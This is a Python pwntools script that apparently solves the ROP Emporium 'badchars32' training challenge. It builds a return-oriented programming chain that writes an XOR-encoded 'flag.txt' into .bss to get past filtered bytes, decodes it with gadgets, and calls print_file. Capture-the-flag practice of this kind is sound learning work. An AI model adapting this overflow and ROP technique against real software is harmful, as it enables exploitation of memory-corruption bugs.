#!/usr/bin/env python3

# Title:        exploit.py
# Description:  badchars32 ropemporium
# Author:       bluecosmo

from pwn import *

elf = context.binary = ELF("./badchars32")

# Addresses
a_bss1 = 0x0804a018
a_bss2 = 0x0804a018 + 4
a_print_file = p32(elf.symbols["usefulFunction"] + 14)

# Gadgets
MOV_EDI_ESI = p32(0x0804854f) # mov dword ptr [edi], esi ; ret
POP_ESI_EDI_EBP = p32(0x080485b9) # pop esi ; pop edi ; pop ebp ; ret
POP_EBX_ESI_EDI_EBP = p32(0x080485b8) # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
XOR_EBP_BL = p32(0x08048547) # xor byte ptr [ebp], bl ; ret

# Stage 1: Write flag to bss
payload = b"A" * 0x2c
payload += POP_ESI_EDI_EBP
payload += b"dnce"
payload += p32(a_bss1)
payload += b"B" * 0x4
payload += MOV_EDI_ESI
payload += POP_ESI_EDI_EBP
payload += b",vzv"
payload += p32(a_bss2)
payload += b"B" * 0x4
payload += MOV_EDI_ESI

# Stage 2: XOR flag back to plaintext
for i in range(len("flag.txt")):
    payload += POP_EBX_ESI_EDI_EBP
    payload += p32(0x2)
    payload += p32(0xdeadbeef)
    payload += p32(0xdeadbeef)
    payload += p32(a_bss1 + i)
    payload += XOR_EBP_BL

# Stage 3: Call print_file
payload += a_print_file
payload += p32(a_bss1)

# Send payload
p = process(elf.path)
p.sendline(payload)
p.interactive()
